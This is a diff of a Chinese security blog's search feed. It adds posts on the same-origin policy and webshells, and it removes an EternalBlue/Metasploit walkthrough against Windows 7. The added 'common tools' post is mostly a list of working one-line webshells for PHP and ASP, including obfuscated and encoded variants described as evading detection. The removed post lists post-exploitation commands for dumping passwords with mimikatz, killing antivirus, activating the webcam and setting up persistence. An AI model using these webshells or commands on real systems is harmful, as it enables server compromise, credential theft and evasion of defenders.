@@ -3,11 +3,38 @@
   
     
     <entry>
+      <title>XSS 文件上传漏洞 同源策略</title>
+      <link href="/2019/03/03/XSS%E6%BC%8F%E6%B4%9E%E2%80%94%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%20-%20%E5%89%AF%E6%9C%AC/"/>
+      <url>/2019/03/03/XSS%E6%BC%8F%E6%B4%9E%E2%80%94%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%20-%20%E5%89%AF%E6%9C%AC/</url>
+      
+        <content type="html"><![CDATA[<center><font color="#4094C7" size="4">XSS 文件上传漏洞 同源策略</font></center><h1 id="同源策略"><a href="#同源策略" class="headerlink" title=" - 同源策略"></a><font color="#FF0000"> - 同源策略</font></h1><hr><p>所谓同源策略，指的是浏览器对<font color="#FF0000">不同源的脚本或者文本的访问方式进行的限制</font>。<br>比如源a的js不能读取或设置引入的源b的元素属性。</p><h1 id="1-1-同源定义"><a href="#1-1-同源定义" class="headerlink" title=" - 1.1 同源定义 "></a><font color="#FF0000"> - 1.1 同源定义 </font></h1><hr><p>所谓同源，就是指两个页面具有相同的协议，主机（也常说域名），端口，三个要素缺一不可。<br>(同协议，同IP地址，同端口，缺一不可)  </p><p>其实：同源策略限制了不同源之间的交互主要针对的是js中的XMLHttpRequest等请求。<br>如下情况不受同源策略的影响：  </p><blockquote><p>1.页面中的链接，重定向以及表单提交是不会受到同源策略限制的。<br>链接就不用说了，导航网站上的链接都是链接到其他站点的。而你在域名<br><a href="http://www.foo.cm" target="_blank" rel="noopener">www.foo.cm</a> 下面提交一个表单到 <a href="http://www.bar.cm" target="_blank" rel="noopener">www.bar.cm</a> 是完全可以的。  </p></blockquote><blockquote><p>2.跨域资源嵌入是允许的，当然，浏览器限制了Javascript不能读写加载的内容。 </p></blockquote><h1 id="1-1-同源定义-1"><a href="#1-1-同源定义-1" class="headerlink" title=" - 1.1 同源定义 "></a><font color="#FF0000"> - 1.1 同源定义 </font></h1><hr><h1 id="1-1-同源定义-2"><a href="#1-1-同源定义-2" class="headerlink" title=" - 1.1 同源定义 "></a><font color="#FF0000"> - 1.1 同源定义 </font></h1><hr>]]></content>
+      
+      
+      <categories>
+          
+          <category> XSS </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网络安全 </tag>
+            
+            <tag> 漏洞 </tag>
+            
+            <tag> 同源策略 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
       <title>Web基础</title>
       <link href="/2019/03/03/Web%E5%9F%BA%E7%A1%80/"/>
       <url>/2019/03/03/Web%E5%9F%BA%E7%A1%80/</url>
       
-        <content type="html"><![CDATA[<h2 id="Web知识"><a href="#Web知识" class="headerlink" title="Web知识"></a><center><font color="#4094C7" size="4">Web知识</font></center></h2><h1 id="HTTTP代理"><a href="#HTTTP代理" class="headerlink" title="HTTTP代理"></a><font color="#FF0000">HTTTP代理</font></h1><hr><ol><li>HTTP代理原理：代理位于浏览器和Web服务器之间，有了他之后，浏览器不是直接连接Web服务器去取回网页而是向HTTP代理发出请求，请求数据包会先送到HTTP代理，由HTTP代理来取回浏览器所需要的信息并传送给你的浏览器。<br>简而言之，HTTP代理位于浏览器和Web服务器之间，充当“中间人” 的角色。<br>代理的作用：通过代理我们可以查看、分析浏览器和Web服务器之间的HTTP通信数据。通过查看HTTP流浪，我们可以方便的测试各种Web漏洞，如SQL注入、文件上传、弱口令。<br><img src="https://s2.ax1x.com/2019/03/03/kLoJ8P.png" alt="image"></li></ol>]]></content>
+        <content type="html"><![CDATA[<h2 id="Web知识"><a href="#Web知识" class="headerlink" title="Web知识"></a><center><font color="#4094C7" size="4">Web知识</font></center></h2><h1 id="HTTTP代理"><a href="#HTTTP代理" class="headerlink" title="HTTTP代理"></a><font color="#FF0000">HTTTP代理</font></h1><hr><p>HTTP代理原理：代理位于浏览器和Web服务器之间，有了他之后，浏览器不是直接连接Web服务器去取回网页而是向HTTP代理发出请求，请求数据包会先送到HTTP代理，由HTTP代理来取回浏览器所需要的信息并传送给你的浏览器。<br>简而言之，HTTP代理位于浏览器和Web服务器之间，充当“中间人” 的角色。<br>代理的作用：通过代理我们可以查看、分析浏览器和Web服务器之间的HTTP通信数据。通过查看HTTP流浪，我们可以方便的测试各种Web漏洞，如SQL注入、文件上传、弱口令。<br><img src="https://s2.ax1x.com/2019/03/03/kLoJ8P.png" alt="image"></p><h1 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a><font color="#FF0000">webshell</font></h1><hr><p>webshell是以sap、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以称为网页后门。黑客们在入侵一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。</p>]]></content>
       
       
       <categories>
@@ -21,32 +48,32 @@
             
             <tag> HTTP代理 </tag>
             
+            <tag> webshell </tag>
+            
         </tags>
       
     </entry>
     
     <entry>
-      <title>渗透测试—永恒之蓝入侵windows7</title>
-      <link href="/2019/03/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5windows7/"/>
-      <url>/2019/03/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5windows7/</url>
+      <title>渗透测试常用工具介绍</title>
+      <link href="/2019/03/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/"/>
+      <url>/2019/03/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/</url>
       
-        <content type="html"><![CDATA[<center><font color="#4094C7" size="4">渗透测试—永恒之蓝入侵windows7</font></center><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><font color="#FF0000">信息收集</font></h1><hr><ol><li>通过ping可以查看靶机网络是否可以连接，图示可以看到可以网络是连通的<br><img src="https://s2.ax1x.com/2019/03/02/kqnjOK.png" alt="image"></li><li>通过nmap的隐蔽TCP扫描，可以在不会触发报警的前提下扫描出开放的端口。可以看到很多开放的端口。<br><img src="https://s2.ax1x.com/2019/03/02/kqu5ct.md.png" alt="image"></li></ol><h1 id="威胁建模"><a href="#威胁建模" class="headerlink" title="威胁建模"></a><font color="#FF0000">威胁建模</font></h1><hr><p>我们通过永恒之蓝病毒渗透测试靶机的445端口，并通过meterpreter拿到shell。</p><h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a><font color="#FF0000">渗透测试</font></h1><hr><ol><li>search eternalblue：找到对应攻击模块<br><img src="https://s2.ax1x.com/2019/03/02/kqKEC9.md.png" alt="image"></li><li>show payloads：展示该模块所有可以使用的有效载荷<br><img src="https://s2.ax1x.com/2019/03/02/kqKG8A.png" alt="image"></li><li>options:展示所有选项，设置好相应的ip地址和端口<br><img src="https://s2.ax1x.com/2019/03/02/kq15ex.png" alt="image"></li><li>exploit -z:展开攻击，建立会话，但并接入会话。<br><img src="https://s2.ax1x.com/2019/03/02/kq3t76.png" alt="image"></li><li>sessions -i id:接入会话<br><img src="https://s2.ax1x.com/2019/03/02/kq32Af.png" alt="image"></li></ol><h1 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a><font color="#FF0000">后渗透阶段</font></h1><hr><ol><li>getuid：查看下当前用户的权限。<br><img src="https://s2.ax1x.com/2019/03/02/kq3HH0.png" alt="image"></li><li>sysinfo:查看靶机系统版本信息<br><img src="https://s2.ax1x.com/2019/03/02/kq3v34.png" alt="image"></li><li>screenshot：靶机桌面截图</li><li>webcam_scream：开启靶机视频</li><li>run post/windows/manage/enable_rdp：开启远程桌面控制</li><li>load mimikatz：载入mimikatz</li><li>wdigest：直接查看用户账号和密码<br><img src="https://s2.ax1x.com/2019/03/02/kqGIwq.png" alt="image"></li><li>run killav：关闭杀毒软件</li><li>run hashdump：获取系统密码哈希值</li><li>run packettrecorder:查看目标机所有的流量(i参数运行数据包记录脚本)</li><li>run scraper:摄取用户名和密码、下载全部注册表、挖掘密码哈希值、手收集系统信息等。</li><li>run persistence -X -i 50 -p 443 -r 192.168.<strong><em>.</em></strong>:控制持久化</li><li>irb：进入irb脚本模式，并且执行命令创建脚本，其语言为Ruby。</li></ol><p>#未完待续……</p>]]></content>
+        <content type="html"><![CDATA[<center><font color="#4094C7" size="4">渗透测试常用工具介绍</font></center><h1 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a><font color="#FF0000">一句话木马</font></h1><hr><p>一句话木马基于B/S结构，在注册信息的电子邮箱或者个人主页等中插入类似如下代码：  </p><ol><li>asp一句话木马：&lt;%execute(request(“value”))%&gt;</li><li>php一句话木马：&lt;?php @eval($_POST[value]);?&gt;</li><li>aspx一句话木马：&lt;%@ Page Language=”Jscript”%&gt;、&lt;%eval(Request.Item[“value”])%&gt;</li><li>其他一句话木马：&lt;%eval request(“value”)%&gt;<br>&lt;%execute request(“value”)%&gt;<br>&lt;%execute(request(“value”))%&gt;<br>&lt;%If Request(“value”)&lt;&gt;”” Then Execute(Request(“value”))%&gt;<br>&lt;%if request (“value”)&lt;&gt;””then session(“value”)=request(“value”):end if:if session(“value”)&lt;&gt;”” then execute session(“value”)%&gt;<br><script language="VBScript" runat="server">execute request(“value”)</script><br>&lt;%@ Page Language=”Jscript”%&gt;<br>&lt;%eval(Request.Item[“value”],”unsafe”);%&gt; </li><li>可以躲过雷客图的一句话木马：<br>&lt;%<br>set ms = server.CreateObject(“MSScriptControl.ScriptControl.1”)<br>ms.Language=”VBScript”<br>ms.AddObject “Response”, Response<br>ms.AddObject “request”, request<br>ms.ExecuteStatement(“ev”&amp;”al(request(“”value””))”)<br>%&gt;</li><li>不用’&lt;,&gt;’的asp一句话木马：<script language="VBScript" runat="server">execute request("value")</script> </li><li>不用双引号的一句话木马：<br>&lt;%eval request(chr(35))%&gt;</li><li>UTF-7编码加密:<br>&lt;%@ codepage=65000%&gt;&lt;% response.Charset=”936″%&gt;&lt;%e+j-x+j-e+j-c+j-u+j-t+j-e+j-(+j-r+j-e+j-q+j-u+j-e+j-s+j-t+j-(+j-+ACI-#+ACI)+j-)+j-%&gt;</li></ol><p><img src="https://s2.ax1x.com/2019/03/02/kqGIwq.png" alt="image"></p><p>#未完待续……</p>]]></content>
       
       
       <categories>
           
-          <category> 渗透测试 </category>
+          <category> 渗透测试工具 </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> 渗透测试 </tag>
+            <tag> 一句话木马 </tag>
             
-            <tag> metasploit </tag>
-            
-            <tag> 永恒之蓝 </tag>
+            <tag> 中国菜刀 </tag>
             
         </tags>
       
